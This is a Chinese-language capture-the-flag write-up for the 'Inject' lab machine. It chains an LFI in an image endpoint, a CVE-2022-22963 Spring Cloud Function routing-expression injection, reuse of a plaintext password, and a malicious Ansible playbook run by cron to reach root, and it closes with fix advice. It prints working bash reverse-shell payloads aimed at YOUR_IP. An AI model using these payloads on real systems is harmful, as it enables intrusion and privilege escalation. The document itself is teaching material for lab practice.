概要  
Inject
是一款简单难度的linux机器，他网站具有文件上传功能，容易受到本地（lfl）的影响攻击，通过利用LFL漏洞，可以枚举系统很上的文件，从而发现web应用程序使用的特定版本Spring-Cloud-Function-Web 容易受到CVE-2022-22963
利用，利用它建立最初的访问点，然后通过枚举发现了用户明文密码，和计算机上运行的cronjob计划任务Ansible ,来执行恶意的命令，最终获得root

所需技能  
网络枚举  
Linux基础知识

学到的技能  
利用本地文件包含  
Linux枚举  
创建恶意的ansible脚本

枚举信息收集  
nmap -min-rate 10000 -p- -T4 10.10.11.204  
Starting Nmap 7.93 ( <https://nmap.org> ) at 2023-07-17 23:45 EDT  
Nmap scan report for 10.10.11.204  
Host is up (0.57s latency).  
Not shown: 65412 filtered tcp ports (no-response), 121 closed tcp ports (conn-refused)  
PORT STATE SERVICE  
22/tcp open ssh  
8080/tcp open http-proxy

![](./img/7982091375544175537.png)

通过我们对页面的仔细观察  
我们发现了upload

![](./img/4011711416848656527.png)

我们上传不是图片后缀的内容被提示

![](./img/501268563629130062.png)

只接受图像文件！

我们上传正常的图片  
返回我们图片链接

![](./img/9093638818942218796.png)

我们访问图片  
<http://10.10.11.204:8080/show_image?img=Inject.png>  
我们发现/show_image 追加的img参数图像查询，它的值为上传图像的名称

应用程序似乎读取了图像参数同时包括了图像参数的内容（在服务器上）  
如果应用程序没有正确的处理图像参数，我们是不是就可以手工构造一个恶意的请求，其中包含目录以外的文件，这个就是本地文件包含

什么是本地文件包含

本地文件包含（Local File
Inclusion，LFI）是一种常见的网络安全漏洞，出现在基于Web的应用程序中。它发生在应用程序在加载本地文件时未正确验证用户提供的输入数据，导致攻击者可以通过构造恶意请求来包含并执行本地文件系统上的任意文件。  
LFI漏洞通常发生在应用程序使用用户提供的输入来构造文件路径时，但未对输入进行适当的验证和过滤。攻击者可以通过在请求中注入特定的文件路径，使应用程序加载包含攻击者指定的文件内容的文件  
一个常见示列就是当应用程序使用文件路径作为输入，如果同时信任该输入，并且同时对该输入的内容没有进行有效的验证过滤安全检查。攻击者就可以利用  
../和输入文件路径的绝对路径，进行本地文件系统中的敏感信息查看

列如 我们就可以输入：

<http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd>

![](./img/9174584413591645525.png)

我们使用burp把包发送到Repeate  
我们成功读取到了了/etc/passwd http响应，从而验证应用程序中存在 lfl 漏洞，现在就可以利用它深入挖掘应用程序源代码  
通过枚举文件系统揭示目录结构发现/var/www/这是web应用常用的目录，  
../../../../../../var/www

![](./img/5332317159204271154.png)

![](./img/8730086304108554374.png)

../../../../../../var/www/WebApp/pom.xml

通过对应用 程序的仔细检查我们发现了

![](./img/8308505758590926450.png)

通过引擎搜索我们发现了CVE-2022-22963 的poc的cve

通过发送 恶意的请求到 /functionRout 进行利用

echo -n "bash -i >& /dev/tcp/YOUR_IP/1337 0>&1" | base64

我们把请求post发布到http  
spring.cloud.function.routing-expression:
T(java.lang.Runtime).getRuntime().exec("bash  
-c {echo,your base64}|{base64,-d}|{bash,-  
i}")  
本地启动一个监听  
nc -lvnp 1337

启动burp发送数据包

![](./img/7848227200074100467.png)

![](./img/8211336204865333909.png)

![](./img/4333283297135457486.png)  
横向移动

我们在/home/frank/.m2 目录下面发现了phil用户和密码

![](./img/5807965675177583544.png)

我们切换用户  
su phil

![](./img/3384964907380322700.png)

权限提升

我们上传pspy 通过本地搭建http服务上传pspy到目标服务器

python3 -m http.server 80

目标机执行 wget <http://yourip/pspy>

chmod +x pspy64  
加入可执行权限

![](./img/449519336870527631.png)

我们会发现下面进程每2分钟进行一次 ，表明它们可能作为 cronjob 运行

![](./img/508099869099515436.png)

通过搜索引擎ansible-parallel <https://pypi.org/project/ansible-parallel/>  
ansible-parallell是一个执行多个python包的脚本 /usr/local/bin/ansible-paraller正在执行
/opt/automation/tasks下的*.yml  
同时从记时任务中 cp root下的 playbook_1.yml ，这个命令可能是替换/opt/automation/tasks中的某一个yml文件

什么是 Ansible

ansible是一种开源的自动化工具，用于配置管理、应用程序部署和编排任务。它可以帮助自动化大规模的IT环境和复杂的工作流程，使系统管理员和开发人员能够更高效地管理和部署软件应用。  
以下是Ansible的一些主要特点和概念：  
声明式语言:
Ansible使用基于YAML的简洁和易读的语法来描述系统的状态和配置，称为Playbooks（剧本）。通过编写Playbooks，可以定义系统应该如何配置和工作。  
无需客户端代理: Ansible使用SSH协议来远程连接到服务器，无需在受管节点上安装客户端代理。这使得配置管理和自动化部署过程更加简单和轻量级。  
模块化架构: Ansible使用模块来执行各种任务，例如文件操作、软件包管理、服务管理等。它提供了丰富的内置模块，也支持自定义模块以满足特定需求。  
基于剧本的编排:
Ansible的主要概念是Playbooks，它们是以YAML格式编写的剧本文件。Playbooks描述了一系列任务和配置操作，可以按照特定的顺序执行，以实现自动化工作流程。  
可扩展性: Ansible可以轻松地扩展到大规模环境，支持并行执行任务和多主机操作。它提供了丰富的库和插件生态系统，使用户能够自定义和扩展其功能。  
Ansible的主要目标是简化和加速系统配置和部署的过程，减少手动操作和人为错误。它被广泛用于自动化云环境、服务器配置、应用程序部署和持续集成/持续交付（CI/CD）流程。Ansible还可以与其他工具和平台集成，如云平台、配置管理数据库（CMDB）和编排工具，以实现更全面的自动化解决方案。  
我们来查看 playbook_1.yml

![](./img/7262421784055121431.png)  
这个Playbook的作用是在本地主机上检查名为webapp的服务，确保它在系统启动时启用且已经处于运行状态。如果服务未启用或未运行，则Ansible将采取必要的操作，使其启用并运行

ls -al /opt/automation/tasks  
我们发现作为我们这个用户拥有读写权限

![](./img/6047633454791292342.png)

知道了cronjob执行所有的*.yml文件，我们就创建恶意的脚本来提升我们的权限  
Ansible 执行我们的脚本

  * hosts: localhost  
tasks:

  * name: Checking webapp service  
shell: bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

我们等待2分钟以后

![](./img/8951683861666467490.png)

![](./img/1238355650815975606.png)

就拿到了root 权限

修复 建议：  
1 首先要修复 lfl  
为了防止本地文件包含漏洞，开发人员应该始终对用户提供的输入数据进行验证和过滤。建议采取以下措施来防止LFI漏洞的利用：  
不要直接使用用户提供的输入构造文件路径，而是使用白名单机制限制允许访问的文件。  
对用户输入进行严格的输入验证和过滤，确保只包含合法的文件路径字符。  
使用安全的文件访问函数和API，如绝对路径而非相对路径访问文件。  
最小化应用程序对文件系统的访问权限，仅允许访问必要的文件和目录。  
2修复用户名密码明文存储同时一样,可以直接登陆

3 修复 /opt/automation/tasks 目录权限本着最小化原则

